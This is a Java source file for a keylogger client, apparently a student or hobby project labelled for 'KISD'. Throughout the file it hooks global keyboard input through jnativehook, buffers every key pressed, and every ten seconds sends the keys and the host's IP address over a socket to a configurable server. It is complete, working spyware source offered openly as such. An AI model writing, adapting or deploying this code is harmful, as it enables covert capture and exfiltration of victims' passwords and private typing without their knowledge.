package org.killeenisd;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * A small keylogger project for KISD.
 * 
 * @author Desmond Jackson
 */
public class JStrokeClient extends Thread implements NativeKeyListener {

	/**
	 * The ip address of the server.
	 */
	private String ip;

	/**
	 * The port of the server to connect to.
	 */
	private int port;

	/**
	 * The amount of seconds before the typed keys are sent to the server.
	 */
	private int seconds;

	/**
	 * Creates a lock for the threads in this program.
	 */
	private static final Object LOCK = new Object();

	/**
	 * A list of all keys typed.
	 */
	private static final List<String> KEYS_TYPED = new ArrayList<String>();

	/**
	 * Creates a new JStrokeClient instance.
	 * 
	 * @param ip The ip address of the server
	 * 
	 * @param port The port of the server to connect to
	 * 
	 * @param seconds The amount of seconds before the typed keys are sent to the
	 * server
	 * 
	 * @throws NativeHookException 
	 */
	public JStrokeClient(String ip, int port, int seconds) throws NativeHookException {
		super();
		this.ip = ip;
		this.port = port;
		this.seconds = seconds * 1000;
		GlobalScreen.registerNativeHook();
		GlobalScreen.getInstance().addNativeKeyListener(this);
	}

	/**
	 * The main class.
	 * 
	 * @param args Any string arguments passed to this program
	 */
	public static void main(String[] args) {
		try {
			(new JStrokeClient("localhost", 4545, 10)).start();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void run() {
		long startTime = System.currentTimeMillis();
		while (true) {
			while ((System.currentTimeMillis()) - startTime < seconds);
			try {
				Socket socket = new Socket(ip, port);
				DataOutputStream dout = new DataOutputStream(socket.getOutputStream());
				dout.writeInt(0);
				dout.writeUTF(InetAddress.getLocalHost().getHostAddress());
				dout.writeInt(0);
				String buffer = "";
				synchronized (LOCK) {
					for (String keyTyped : KEYS_TYPED)
						buffer += keyTyped + " ";
					KEYS_TYPED.clear();
				}
				dout.writeUTF(buffer);
				dout.writeInt(0);
				dout.close();
				socket.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
			KEYS_TYPED.clear();
			startTime = System.currentTimeMillis();
		}
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		synchronized (LOCK) {
			KEYS_TYPED.add(NativeKeyEvent.getKeyText(e.getKeyCode()));   
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {}

}
